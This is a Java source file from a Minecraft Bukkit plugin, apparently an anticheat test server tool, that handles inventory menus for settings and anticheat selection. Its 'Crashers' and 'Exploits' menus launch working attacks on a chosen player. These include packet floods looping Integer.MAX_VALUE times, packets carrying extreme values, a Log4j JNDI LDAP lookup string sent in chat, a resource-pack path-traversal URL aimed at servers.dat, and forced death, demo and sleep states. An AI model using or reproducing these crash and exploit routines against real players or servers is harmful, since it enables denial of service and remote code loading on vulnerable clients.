package me.killstorm103.Rebug.Events;

import java.util.ArrayList;
import java.util.Map;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.Sound;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryCloseEvent;
import org.bukkit.event.inventory.InventoryType;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerWorldBorder;

import ac.grim.grimac.api.GrimAbstractAPI;
import ac.grim.grimac.api.GrimUser;
import io.netty.buffer.Unpooled;
import me.killstorm103.Rebug.Main.Rebug;
import me.killstorm103.Rebug.Tasks.ResetScaffoldTestArea;
import me.killstorm103.Rebug.Utils.PT;
import me.killstorm103.Rebug.Utils.TeleportUtils;
import me.killstorm103.Rebug.Utils.User;
import net.minecraft.server.v1_8_R3.BlockPosition;
import net.minecraft.server.v1_8_R3.ChatComponentText;
import net.minecraft.server.v1_8_R3.EntityPlayer;
import net.minecraft.server.v1_8_R3.EnumParticle;
import net.minecraft.server.v1_8_R3.MobEffect;
import net.minecraft.server.v1_8_R3.PacketDataSerializer;
import net.minecraft.server.v1_8_R3.PacketPlayOutBed;
import net.minecraft.server.v1_8_R3.PacketPlayOutChat;
import net.minecraft.server.v1_8_R3.PacketPlayOutCollect;
import net.minecraft.server.v1_8_R3.PacketPlayOutCustomPayload;
import net.minecraft.server.v1_8_R3.PacketPlayOutEntityEffect;
import net.minecraft.server.v1_8_R3.PacketPlayOutEntityMetadata;
import net.minecraft.server.v1_8_R3.PacketPlayOutEntityStatus;
import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.PacketPlayOutGameStateChange;
import net.minecraft.server.v1_8_R3.PacketPlayOutNamedEntitySpawn;
import net.minecraft.server.v1_8_R3.PacketPlayOutPlayerInfo;
import net.minecraft.server.v1_8_R3.PacketPlayOutPosition;
import net.minecraft.server.v1_8_R3.PacketPlayOutResourcePackSend;
import net.minecraft.server.v1_8_R3.PacketPlayOutWorldParticles;
import net.minecraft.server.v1_8_R3.Vec3D;


public class EventMenus implements Listener
{
	private void CrashSendPacket (Player attacker, Player target, String mode, String spawncrashmode)
	{
		if (attacker == null || target == null) return;
		
		if (mode.equalsIgnoreCase("Server")) // Test in dev
		{
			for (int i = 0; i < Integer.MAX_VALUE; i ++)
			PT.SendPacket(target, new PacketPlayOutCollect(target.getEntityId(), Integer.MAX_VALUE));
			PT.Log(attacker, "trying Server Crasher!");
			return;
		}
		if (mode.equalsIgnoreCase("Test"))
		{
			WrapperPlayServerWorldBorder p = new WrapperPlayServerWorldBorder(target.getLocation().getX(), target.getLocation().getBlockZ());
			PacketEvents.getAPI().getPlayerManager().sendPacket(target, p);
			/*
			ItemStack item = Reset(new ItemStack(Material.ANVIL, 1));
			itemMeta.setDisplayName(ChatColor.DARK_RED + "Crash Anvil!");
			item.setItemMeta(itemMeta);
			player.setItemInHand(item);
			player.updateInventory();
			PT.PlaceItem(player, player.getItemInHand(), new BlockPosition(player.getLocation().getBlockX(), player.getLocation().getBlockY(), player.getLocation().getBlockZ()), EnumDirection.UP, .5F, 0F, .5F);
			
			*/
			PT.Log(attacker, "tried crashing " + target.getName() + " with test");
			return;
		}
		if (mode.equalsIgnoreCase("NumbWare"))
		{
			PT.SendPacket(target, new PacketPlayOutCustomPayload("NWS|Crash Bed",
				    new PacketDataSerializer(Unpooled.buffer())));
		}
		if (mode.equalsIgnoreCase("Explosion"))
		{
            PT.SendPacket(target, new PacketPlayOutExplosion(target.getLocation().getX(), target.getLocation().getY(), target.getLocation().getZ(), Float.MAX_VALUE, new ArrayList<BlockPosition>(), new Vec3D(target.getLocation().getX(), target.getLocation().getY(), target.getLocation().getZ())));
		}
		if (mode.equalsIgnoreCase("Particle"))
		{
			float red = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), green = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), blue = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE);
			
            for (int i = 0; i < EnumParticle.values().length; i ++)
            {
                PT.SendPacket(target, new PacketPlayOutWorldParticles(EnumParticle.a(i), true, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), red, green, blue, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), Integer.MAX_VALUE, new int[]{0}));
            }
		}
		if (mode.equalsIgnoreCase("GameState"))
		{
			PT.SendPacket(target, new PacketPlayOutGameStateChange(7, (float) (PT.nextBoolean() ? PT.randomNumber(Float.MAX_VALUE, 500) : PT.randomNumber(-Float.MAX_VALUE, -500))));
		}
		if (mode.equalsIgnoreCase("Log4j"))
		{
			String str = "\\${jndi:ldap://192.168." + PT.nextInt(1, 253) + "." + PT.nextInt(1, 253) + "}";
			ChatComponentText text = new ChatComponentText("/tell " + PT.randomString(10) + " " + str);
			PT.SendPacket(target, new PacketPlayOutChat (text, (byte) 1));
		}
		if (mode.equalsIgnoreCase("illegal Position"))
		{
			for (int i = 0; i < PacketPlayOutPosition.EnumPlayerTeleportFlags.values().length; i ++)
			{
				PT.SendPacket(target, new PacketPlayOutPosition(Double.MAX_VALUE, Double.MAX_VALUE, -Double.MAX_VALUE, Float.MAX_VALUE, -Float.MAX_VALUE, PacketPlayOutPosition.EnumPlayerTeleportFlags.a(i)));
			}
		}
		if (mode.equalsIgnoreCase("illegal Effect"))
		{
			for (int i = 0; i < Integer.MAX_VALUE; i++)
				PT.SendPacket(target, new PacketPlayOutEntityEffect (target.getEntityId(), new MobEffect(Integer.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE, true, true)));
			
		}
		if (mode.equalsIgnoreCase("SpawnEntity"))
		{
			PT.CrashPlayer(attacker, target, spawncrashmode);
			PT.Log(attacker, Rebug.RebugMessage + "tried using the " + mode + " " + spawncrashmode + " Crash Exploit on " + target.getName());
			return;
		}
		if (mode.equalsIgnoreCase("ResourcePack"))
		{
			PT.SendPacket(target, new PacketPlayOutResourcePackSend("a8e2cdd0a39c3737b6a6186659c2ad6b816670d2", "level://../servers.dat"));
		}
		PT.Log(attacker, Rebug.RebugMessage + "tried using the " + mode + " Crash Exploit on " + target.getName());
	}
	private void ExploitSendPacket (Player attcter, Player target, String exploit)
	{
		if (attcter == null || target == null) return;
		User user = Rebug.getUser(target);
		if (user == null) return;
		EntityPlayer px = PT.getEntityPlayer(target);
		if (px == null) return;
		
		if (exploit.equalsIgnoreCase("ResourcePack"))
		{
			target.setResourcePack("level://../servers.dat");
		}
		if (exploit.equalsIgnoreCase("force sleep"))
		{
			PT.SendPacket(target, new PacketPlayOutBed(PT.getEntityPlayer(target), new BlockPosition(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
		}
		if (exploit.equalsIgnoreCase("demo"))
		{
			PT.SendPacket(target, new PacketPlayOutGameStateChange(5, 0));
		}
		if (exploit.equalsIgnoreCase("fake death")) 
		{
			PT.SendPacket(target, new PacketPlayOutEntityStatus(PT.getEntityPlayer(target), (byte) 3));
		}
		if (exploit.equalsIgnoreCase("Test"))
		{
			TeleportUtils.GenerateCrashLocation(target);
		}
		if (exploit.equalsIgnoreCase("Spawn Player"))
		{
			user.CancelInteract = true;
			user.Exterranl_Damage = false;
			user.FallDamage = false;
			user.Hunger = false;
			target.setNoDamageTicks(Integer.MAX_VALUE);
			px.setInvisible(true);
			PT.SendPacket(target, new PacketPlayOutPlayerInfo(PacketPlayOutPlayerInfo.EnumPlayerInfoAction.ADD_PLAYER, px));
			PT.SendPacket(target, new PacketPlayOutEntityMetadata(px.getId(), px.getDataWatcher(), true));
			PT.SendPacket(target, new PacketPlayOutNamedEntitySpawn(PT.getEntityHuman(target)));
		}
		
		PT.Log(attcter, Rebug.RebugMessage + "tried using the " + exploit + " Exploit on " + target.getName());
	}
	
	public void Command (String command)
	{
		Bukkit.dispatchCommand(Bukkit.getServer().getConsoleSender(), "rebug " + command);
	}
	public void Command (Player sender, String command)
	{
		Bukkit.dispatchCommand(sender, "rebug " + command);
	}
	private void Refresh (Player player, String menu)
	{
		Bukkit.getScheduler().scheduleSyncDelayedTask(Rebug.getGetMain(), new Runnable()
        {
            @Override
            public void run()
            {
            	Command(player, menu);
            }
        }, 0L);
	}
	/*
	@EventHandler
	public void onOpenGui (InventoryOpenEvent e)
	{
		User user = Rebug.getUser((Player) e.getView().getPlayer());
		if (user == null || user.CommandTarget == null) return;
		
	}
	*/
	@EventHandler
	public void onInventoryClose (InventoryCloseEvent e)
	{
		User user = Rebug.getUser((Player) e.getPlayer());
		if (user == null || user.CommandTarget == null) return;
		
		if (user.InvSeed)
		{
			for (Map.Entry<ItemStack, Integer> map : user.OldItems.entrySet())
			{
				if (map == null || map.getKey() == null) return;
				
				if (map.getKey().getType() == Material.AIR)
					user.getPlayer().getInventory().getItem(map.getValue()).setType(Material.AIR);
				else
					user.getPlayer().getInventory().setItem(map.getValue(), map.getKey());
			}
			user.getPlayer().updateInventory();
			user.OldItems.clear();
			user.InvSeed = false;
		}
	}
	@SuppressWarnings("deprecation")
	@EventHandler
	public void onMenu (InventoryClickEvent e)
	{
		ItemMeta meta = null;
		String MenuName = ChatColor.stripColor(e.getView().getTitle());
		ItemStack item = e.getCurrentItem(), getCursor = e.getCursor();
		Player player = (Player) e.getView().getPlayer();
		int slot = e.getSlot();
		if (Rebug.debug)
		{
			Rebug.Debug(player, "slot= " + slot + " item= " + item + " ItemName= " +  ChatColor.stripColor(item.getItemMeta().getDisplayName()) + " Menu= " + MenuName);
		}
		if ((e.getInventory().getType() == InventoryType.ENCHANTING || e.getInventory().getType() == InventoryType.ANVIL) && !player.isOp() && !player.hasPermission("me.killstorm103.rebug.server_owner") && !player.hasPermission("me.killstorm103.rebug.server_admin"))
		{
			e.setCancelled(true);
			player.sendMessage(Rebug.RebugMessage + "You can't do that you don't have perms!");
			return;
		}
		if (MenuName != null)
		{
			if (e.getClickedInventory() != e.getWhoClicked().getInventory() && item != null && MenuName.equalsIgnoreCase("Items") && item.getType() == Material.WOOL && getCursor != null)
			{
				if (item.hasItemMeta() && item.getItemMeta().hasDisplayName())
				{
					if (ChatColor.stripColor(item.getItemMeta().getDisplayName()).equalsIgnoreCase("delete item!") && getCursor.getType() != Material.AIR)
					{
						e.setCursor(null);
						e.setCancelled(true);
						return;
					}
					if (ChatColor.stripColor(item.getItemMeta().getDisplayName()).equalsIgnoreCase("Debug item!") && getCursor.getType() != Material.AIR)
					{
						player.sendMessage(Rebug.RebugMessage + "Debug= " + getCursor);
						e.setCancelled(true);
						return;
					}
				}
			}
			if (e.getClickedInventory() != e.getWhoClicked().getInventory() && item != null && (MenuName.equalsIgnoreCase("Items") || MenuName.equalsIgnoreCase("Crashers") || MenuName.equalsIgnoreCase("Exploits")) && item.getType() == Material.STAINED_GLASS_PANE)
			{
				e.setCancelled(true);
				return;
			}
		}
		if (MenuName != null)
		{
			User user = Rebug.getUser((Player) e.getView().getPlayer()), BackUser;
			if (user == null)
			{
				PT.KickPlayer((Player) e.getView().getPlayer(), PT.RebugsUserWasNullErrorMessage("in " + MenuName));
				return;
			}
			BackUser = user;
			if (item != null && item.getItemMeta() != null)
			{
				meta = item.getItemMeta();
				String ItemName = meta.hasDisplayName() ? ChatColor.stripColor(meta.getDisplayName()) : null;
				if (MenuName.equalsIgnoreCase("Inventory") && user.InvSeed && e.getClickedInventory() == user.getPlayer().getInventory())
				{
					if (e.getClickedInventory() != user.CommandTarget.getInventory())
					{
						if (ItemName.equalsIgnoreCase("Max Item"))
						{
							e.setCancelled(true);
							e.getCursor().setAmount(64);
							e.setCursor(e.getCursor());
						}
						if (ItemName.equalsIgnoreCase("Delete Item"))
						{
							e.setCancelled(true);
							e.setCursor(null);
						}
					}
				}
				
				if (MenuName.equalsIgnoreCase("AntiCheats") && e.getClickedInventory() != user.getPlayer().getInventory())
				{
					e.setCancelled(true);
					if (item == null || !item.hasItemMeta() || item.getItemMeta().getLore() == null || item.getItemMeta().getLore().size() <= 1 || ItemName.equalsIgnoreCase("User " + user.getPlayer().getName()))
						return;
				
					final String command = Rebug.getGetMain().getConfig().getString("user-update-perms-command").replace("%user%", user.getPlayer().getName()).replace("%anticheat%", ItemName);
					Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
					if (user.AutoCloseAntiCheatMenu)
						user.getPlayer().closeInventory();
					
					
					// Make update perms?
					GrimAbstractAPI grim_api = Rebug.getGrimAC();
					if (grim_api != null)
					{
						GrimUser grim_user = grim_api.getGrimUser(user.getPlayer());
						if (grim_user != null)
							grim_user.updatePermissions();
						
						grim_api.reload();
					}
					
					Bukkit.getScheduler().runTaskLater(Rebug.getGetMain(), new Runnable()
					{
						
						@Override
						public void run()
						{
							user.AntiCheat = ItemName;
							ShowFlags (user);
							Rebug.UpdateScoreBoard(user, 2, ChatColor.DARK_RED + "AC " + user.getColoredAntiCheat());
							PT.PlaySound(user.getPlayer(), Sound.ANVIL_USE, 1, 1);
							String AC = ChatColor.stripColor(user.AntiCheat);
							user.getPlayer().sendMessage(Rebug.RebugMessage + "You selected: " + AC + (AC.equalsIgnoreCase("vanilla") ||
							AC.equalsIgnoreCase("nocheatplus") ? "" : " " + ChatColor.stripColor(PT.SubString(item.getItemMeta().getLore().get(3), 10,
							item.getItemMeta().getLore().get(3).length()).replace(" ", ""))));
						}
					}, 15);
				}
				if (MenuName.equalsIgnoreCase("Exploits") && e.getClickedInventory() != user.getPlayer().getInventory() && ItemName != null)
				{
					e.setCancelled(true);
					if (!ItemName.equalsIgnoreCase("User " + user.getPlayer().getName()))
						ExploitSendPacket(user.getPlayer(), user.CommandTarget, ItemName);
				}
				if (MenuName.equalsIgnoreCase("Vanilla Fly Checks") && e.getClickedInventory() != user.getPlayer().getInventory())
				{
					e.setCancelled(true);
					if (item != null && ItemName != null && item.getType() != Material.STAINED_GLASS_PANE)
					{
						if (ItemName.equalsIgnoreCase("Back"))
						{
							Refresh(user.getPlayer(), "menu settings");
							return;
						}
						if (ItemName.equalsIgnoreCase("1.8.x"))
							user.Vanilla1_8FlyCheck =! user.Vanilla1_8FlyCheck;
						
						if (ItemName.equalsIgnoreCase("1.9+"))
							user.Vanilla1_9FlyCheck =! user.Vanilla1_9FlyCheck;
						
						e.setCurrentItem(user.getMadeItems (MenuName, ItemName));
					}
				}
				if (MenuName.equalsIgnoreCase("Rebug Settings") && (user.getPlayer().isOp() || user.getPlayer().hasPermission("me.killstorm103.rebug.server_owner") || user.getPlayer().hasPermission("me.killstorm103.rebug.server_admin")) && e.getClickedInventory() != user.getPlayer().getInventory())
				{
					e.setCancelled(true);
					
					if (item != null && ItemName != null && !ItemName.equalsIgnoreCase("Add more Settings as i think of them!"))
					{
						if (ItemName.equalsIgnoreCase("back"))
						{
							Refresh(user.getPlayer(), "menu settings");
							return;
						}
						if (ItemName.equalsIgnoreCase("Debug"))
							Rebug.debug =! Rebug.debug;
						
						if (ItemName.equalsIgnoreCase("Debug To Ops Only"))
						{
							Rebug.debugOpOnly =! Rebug.debugOpOnly;
						}
						if (ItemName.equalsIgnoreCase("Reset Scaffold Area"))
						{
							Rebug.getGetMain().RestScaffoldTask.cancel();
							ResetScaffoldTestArea.getMainTask().run();
							return;
						}
						if (ItemName.equalsIgnoreCase("Kick on reload config"))
						{
							Rebug.KickOnReloadConfig =! Rebug.KickOnReloadConfig;
						}
						if (ItemName.equalsIgnoreCase("Reload Config"))
						{
							Rebug.getGetMain().Reload_Configs();
							Bukkit.getConsoleSender().sendMessage(Rebug.RebugMessage + "Successfully Reloaded Config!");
							if (Rebug.KickOnReloadConfig)
							{
								for (Player players : Bukkit.getOnlinePlayers())
								{
									PT.KickPlayer(players, ChatColor.DARK_RED + "Rejoin reloading Rebug's Config!");
								}
							}
							else
								user.getPlayer().sendMessage(Rebug.RebugMessage + "Successfully Reloaded Config!");
						}
						else
							user.UpdateItemInMenu(user.getRebugSettingsMenu, slot, user.getMadeItems(MenuName, ItemName));
					}
				}
				if (MenuName.equalsIgnoreCase("Player Settings"))
				{
					if (e.getClickedInventory() != user.getPlayer().getInventory())
					{
						e.setCancelled(true);
						if (ItemName != null && !ItemName.equalsIgnoreCase("Add more Settings as i think of them!"))
						{
							if (ItemName.equalsIgnoreCase("Rebug Settings"))
							{
								Refresh(user.getPlayer(), "menu Rebug%Settings");
								return;
							}
							if (ItemName.equalsIgnoreCase("Hunger"))
							{
								user.Hunger =! user.Hunger;
							}
							if (ItemName.equalsIgnoreCase("Fall Damage"))
							{
								user.FallDamage =! user.FallDamage;
							}
							if (ItemName.equalsIgnoreCase("Exterranl Damage"))
							{
								user.Exterranl_Damage =! user.Exterranl_Damage;
							}
							if (ItemName.equalsIgnoreCase("Damage Resistance"))
							{
								user.Damage_Resistance =! user.Damage_Resistance;
								if (user.Damage_Resistance)
									user.getPlayer().addPotionEffect(new PotionEffect(PotionEffectType.DAMAGE_RESISTANCE, Integer.MAX_VALUE, 3, true, false));
								else
									user.getPlayer().removePotionEffect(PotionEffectType.DAMAGE_RESISTANCE);
							}
							if (ItemName.equalsIgnoreCase("Fire Resistance"))
							{
								user.Fire_Resistance =! user.Fire_Resistance;
								if (user.Fire_Resistance)
									user.getPlayer().addPotionEffect(new PotionEffect(PotionEffectType.FIRE_RESISTANCE, Integer.MAX_VALUE, 0, true, false));
								else
									user.getPlayer().removePotionEffect(PotionEffectType.FIRE_RESISTANCE);
							}
							if (ItemName.equalsIgnoreCase("Infinite Blocks"))
							{
								if (user.getPlayer().hasPermission("me.killstorm103.rebug.user.infinite_blocks") || user.getPlayer().isOp() || user.getPlayer().hasPermission("me.killstorm103.rebug.server_owner") || user.getPlayer().hasPermission("me.killstorm103.rebug.server_admin"))
									user.Infinite_Blocks =! user.Infinite_Blocks;
								else
								{
									user.getPlayer().sendMessage(Rebug.RebugMessage + "You don't have Permission to use this!");
									return;
								}
							}
							if (ItemName.equalsIgnoreCase("Vanilla Fly Checks"))
							{
								Command(user.getPlayer(), "menu Vanilla%Fly%Checks");
								return;
							}
							if (ItemName.equalsIgnoreCase("Potions"))
							{
								user.PotionEffects =! user.PotionEffects;
							}
							if (ItemName.equalsIgnoreCase("Auto Refill Blocks"))
							{
								user.AutoRefillBlocks =! user.AutoRefillBlocks;
							}
							if (ItemName.equalsIgnoreCase("Notify On Flying Kick"))
							{
								user.NotifyFlyingKick =! user.NotifyFlyingKick;
							}
							if (ItemName.equalsIgnoreCase("Proximity Player Hider"))
							{
								user.ProximityPlayerHider =! user.ProximityPlayerHider;
							}
							if (ItemName.equalsIgnoreCase("AllowAT"))
							{
								user.AllowAT =! user.AllowAT;
							}
							if (ItemName.equalsIgnoreCase("Flags"))
							{
								user.ShowFlags =! user.ShowFlags;
								ShowFlags(user);
							}
							if (ItemName.equalsIgnoreCase("Kick"))
							{
								user.AntiCheatKick =! user.AntiCheatKick;
							}
							if (ItemName.equalsIgnoreCase("Hide All Online Players"))
							{
								user.HideOnlinePlayers =! user.HideOnlinePlayers;
							}
							if (ItemName.equalsIgnoreCase("Direct Messages"))
							{
								user.AllowDirectMessages =! user.AllowDirectMessages;
							}
							if (ItemName.equalsIgnoreCase("Auto Close AntiCheats Menu"))
							{
								user.AutoCloseAntiCheatMenu =! user.AutoCloseAntiCheatMenu;
							}
							user.UpdateMenuValueChangeLore(user.SettingsMenu, slot, 0, user.getValues ("Player Settings", ItemName));
						}
					}
				}
				if (MenuName.equalsIgnoreCase("Items"))
				{
					if (e.getClickedInventory() != user.getPlayer().getInventory()) 
					{
						e.setCancelled(true);
						if (PT.isInventoryFull(user.getPlayer()))
						{
							user.getPlayer().sendMessage(Rebug.RebugMessage + "Your Inventory's full make some space!");
							return;
						}
						for (int i = 0; i < user.getPlayer().getInventory().getSize(); i ++)
						{
							ItemStack InventoryItem = user.getPlayer().getInventory().getItem(i);
							if (InventoryItem == null)
							{
								user.getPlayer().getInventory().setItem(i, item);
								break;
							}
						}
					}
				}
				if (MenuName.equalsIgnoreCase("Crashers"))
				{
					if (ItemName != null)
					{
						if (ItemName.equalsIgnoreCase("User " + user.getPlayer().getName()))
						{
							e.setCancelled(true);
							return;
						}
						if (!user.getPlayer().isOp() && ItemName.equalsIgnoreCase("illegal Effect"))
						{
							user.getPlayer().sendMessage("because this crashes the server to you have to be Opped to use it!");
							e.setCancelled(true);
							return;
						}
						// TODO Move this
						if (ItemName.equalsIgnoreCase("spawn entity crashers"))
						{
							user.getPlayer().openInventory(user.getSpawnEntityCrashers());
							e.setCancelled(true);
							return;
						}
						CrashSendPacket(user.getPlayer(), user.CommandTarget, ItemName, null);
						e.setCancelled(true);
					}
				}
				if (MenuName.equalsIgnoreCase("Spawn Entity Crashers"))
				{
					if (ItemName != null && e.getClickedInventory() != user.getPlayer().getInventory())
					{
						if (ItemName.equalsIgnoreCase("Back"))
						{
							e.setCancelled(true);
							user.getPlayer().closeInventory();
							Bukkit.getScheduler().scheduleSyncDelayedTask(Rebug.getGetMain(), new Runnable()
				            {
				                @Override
				                public void run()
				                {
				                	Command(BackUser.getPlayer(), "menu crashers " + BackUser.CommandTarget);
				                }
				            }, 1L);
							return;
						}
						CrashSendPacket(user.getPlayer(), user.CommandTarget, "SpawnEntity", ItemName);
						e.setCancelled(true);
					}
				}
			}
		}
	}
	// This is a TEST!
	public static void ShowFlags (User user)
	{
		if (user == null) return;
		
		String AntiCheat = ChatColor.stripColor(user.AntiCheat).toLowerCase();
		
		/*
		if (!AntiCheat.equalsIgnoreCase("grimac") && user.AlertsEnabled.containsKey("grimac") && user.AlertsEnabled.get("grimac"))
			Bukkit.dispatchCommand(user.getPlayer(), "grim verbose");
		
		if (user.AlertsEnabled.containsKey(AntiCheat))
			user.AlertsEnabled.remove(AntiCheat);
		*/
		switch (AntiCheat)
		{
		case "grimac":
			Bukkit.dispatchCommand(user.getPlayer(), "grim verbose");
			//user.AlertsEnabled.put(AntiCheat, true);
			break;
		
		default:
			break;
		}
	}
}
